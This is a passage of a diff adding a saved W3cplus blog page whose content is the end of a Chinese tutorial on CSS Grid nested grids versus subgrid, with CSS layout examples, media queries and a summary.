+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>/-<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+    <span class="class"><span class="class">.card-button</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span>/-<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+}
+</code></pre>
+
+<p>再加点<a href="https://www.w3cplus.com/css/css-media-queries-guide.html" target="_blank">媒体查询</a>：</p>
+
+<pre class="css"><code class="css"><span class="at_rule"><span class="at_rule">@<span class="keyword"><span class="keyword">media</span></span> screen and (min-width: <span class="number"><span class="number">480</span></span>px) </span></span>{
+    <span class="class"><span class="class">.cards-container</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">6</span></span>, [col-start] fit-content(<span class="number"><span class="number">9</span></span>rem)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+}
+
+<span class="at_rule"><span class="at_rule">@<span class="keyword"><span class="keyword">media</span></span> screen and (min-width: <span class="number"><span class="number">1024</span></span>px) </span></span>{
+    <span class="class"><span class="class">.cards-container</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">12</span></span>, [col-start] fit-content(<span class="number"><span class="number">9</span></span>rem)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+}
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/OJgRoQv.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/OJgRoQv">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<h2 class="content-title" data-index="2">小结</h2>
+
+<p>在这篇文章我们和大家一起探讨了 CSS 网格中的嵌套网格和子网格。嵌套网格和父网格是相互独立的两个网格，而子网格并不是一个独立的网格，它会继承父网格的网格轨道和网格线名称等。另外，在大部分情况下，子网格的表现和我们所说的网格是一样的，只有部分情况之下还是有差异的，文章中详细的阐述了这些差异性。子网格的出现，给我们 Web 布局带来了一定的便利性，它的出现以至于为什么要有 <code>subgrid</code>。W3C 在制定该草案以及社区都有过详细的讨论。特别是关于 嵌套网格、子网格 和 <code>display:contents</code>，以及最终为什么为选择 <code>subgrid</code>。在下一部分，将和大家聊聊 <code>subgrid</code> 和 <code>display: contents</code> 两者之间的差异。感兴趣的，请持续关注后续相关更新。</p>
+</div></div></div>  </div>
+
+  
+   
+    <div id="node_footer" class="clearfix">
+              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/html5/pure-css-to-do-list-with-contenteditable.html" target="_blank">使用 contenteditable 构建 To-Do List</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/grid-layout-part-16.html" target="_blank">图解CSS: Grid布局（Part16）</a></div>            
+    </div>
+
+        
+
+</div>  </div>
+</div>
+  </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    
+          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
+        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
+          <div class="region region-sidebar-second">
+    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">
+
+    
+  <div class="content">
+    <form class="search-form" role="search" action="https://www.w3cplus.com/css/grid-layout-part-15.html?expire=1699866863&amp;code=O8kk1mfTkzM&amp;sign=00c2aabdda9f35f1c017876f024a0394" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
+  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
+ <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
+</div>
+<input type="hidden" name="delta" value="1">
+<input type="hidden" name="form_build_id" value="form-GaXaDQ-oD0nfJpSVgC_qKr7syrIjjTkcH_BIPLVJYyM">
+<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
+<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
+</div>
+<div id="block-block-53" class="block block-block">
+
+    <h2>直达目的地(^_^)</h2>
+  
+  <div class="content">
+    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li><a data-index="0" href="javascript:;" class="active">什么是嵌套网格</a></li><li><a data-index="1" href="javascript:;">什么是子网格（subgrid）</a></li><li><a data-index="2" href="javascript:;">嵌套网格和子网格的区别</a></li><li><a data-index="3" href="javascript:;">我们为什么需要子网格</a></li><li><a data-index="4" href="javascript:;">如何创建子网格</a></li><li> <ul class="mb-2"><li><a data-index="5" href="javascript:;">行轴上的子网格</a></li><li><a data-index="6" href="javascript:;">列轴上的子网格</a></li><li><a data-index="7" href="javascript:;">两个轴上的子网格</a></li><li><a data-index="8" href="javascript:;">子网格中没有隐式的网格</a></li><li><a data-index="9" href="javascript:;">子网格中的间距</a></li></ul></li><li><a data-index="10" href="javascript:;">子网格行为</a></li><li><a data-index="11" href="javascript:;">子网格使用示例</a></li><li><a data-index="12" href="javascript:;">小结</a></li></ul></div></div>
+
+<script>
+$('.node-blog h2').addClass('content-title');
+$('.node-blog h3').addClass('content-title');
+$('.node-blog h4').addClass('content-title');
+$('.node-blog h5').addClass('content-title');
+//  给 h2 到 h5 增加一个 data-index 的自定义属性
+$('.node-blog h2').attr('data-index', 2);
+$('.node-blog h3').attr('data-index', 3);
+$('.node-blog h4').attr('data-index', 4);
+$('.node-blog h5').attr('data-index', 5);
+
+//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
+function atalog(titleIndex, start) {
+    //  存储 HTML 和当前的索引值
+    var el = {
+        el: '',
+        index: start
+    };
+    var current = 0;  //  已遍历的数量
+
+    for (var i = start;i < $('.content-title').length;i ++) {
+        if (i < current) {
+            //  如果当前 i 的值小于已遍历的数量就跳过
+            continue;
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
+            //  如果是更小一级的标题就调用自身继续查找
+            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
+            //  把返回的 HTML 添加到当前函数的 el 中
+            el.el += '<li> ' + result.el + '</li>';
+            current = result.index + 1;  //  设置已遍历的数量
+            el.index = result.index;  //  设置索引
+            continue;  //  跳过本次循环
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
+            //  如果是更大一级的标题就返回已生成的 HTML 目录
+            el.el = '<ul class="mb-2">' + el.el + '</ul>';
+            return el;
+        }
+        //  生成 HTML 目录
+        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
+        el.index = i;  //  设置当前的索引值为 i
+    }
+    //  添加列表的外层 ul
+    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
+    return el;  //  返回生成的 HTML 目录
+}
+
+//  调用生成目录的函数，从第 0 个 h2 开始
+var el = atalog(2, 0);
+//  把生成的目录插入到文章的开头
+$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
+$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
+//  给生成的目录添加点击事件
+$('.node-blog-title .atalog a').on('click', function () {
+    //  设置滚动条的高度为标题的 offsetTop
+     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
+var position = topPos - 80;
+    $(document).scrollTop(position);
+$('.node-blog-title .atalog a').removeClass('active')
+    $(this).toggleClass('active')
+});
+
+
+</script>
+
+  </div>
+</div>
+<div id="block-block-49" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./Grid布局：15-嵌套网格vs子网格_files/css-1.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./Grid布局：15-嵌套网格vs子网格_files/css-3.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./Grid布局：15-嵌套网格vs子网格_files/css-2.jpg" border="0" alt="" width="300"></a></div>
+
+
+  </div>
+</div>
+  </div>
+      </div>
+    
+
+  </div>
+</div>
+
+  <div id="footer-col" class="footer-col">
+    <div class="container">
+        <div class="region region-footer-col">
+    <div id="block-block-39" class="block block-block">
+
+    <h2>关于我们</h2>
+  
+  <div class="content">
+    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
+<div class="media-body">
+	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
+</div>
+  </div>
+</div>
+<div id="block-block-40" class="block block-block">
+
+    <h2>关于站长</h2>
+  
+  <div class="content">
+    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
+<div class="media-body">
+	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
+	<div class="social">
+		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
+</div>
+<p>&nbsp;</p>
+  </div>
+</div>
+<div id="block-block-41" class="block block-block">
+
+    <h2>我的作品</h2>
+  
+  <div class="content">
+    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
+<div class="media-body">
+	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+  <div id="footer" class="footer">
+    <div class="container">
+        <div class="region region-footer">
+    <div id="block-block-54" class="block block-block">
+
+    
+  <div class="content">
+        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
+  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
+    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
+</div> -->
+    <a id="topLink" title="返回顶部">返回顶部</a>
+</div>  <script type="text/javascript" src="./Grid布局：15-嵌套网格vs子网格_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
+  
+  <script type="text/javascript" src="./Grid布局：15-嵌套网格vs子网格_files/respond.min.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：15-嵌套网格vs子网格_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：15-嵌套网格vs子网格_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：15-嵌套网格vs子网格_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"5I6h5J2m3Ypx3NtvjFsbTyZsyY0h4l7qthZjl8x6gfA","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2736"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/grid-layout-part-15.html?expire=1699866863\u0026code=O8kk1mfTkzM\u0026sign=00c2aabdda9f35f1c017876f024a0394":true}});
+//--><!]]>
+</script>
+<script src="./Grid布局：15-嵌套网格vs子网格_files/jquery.colorbox-min.js.下载"></script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>  
+<span class="bf258"></span>
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
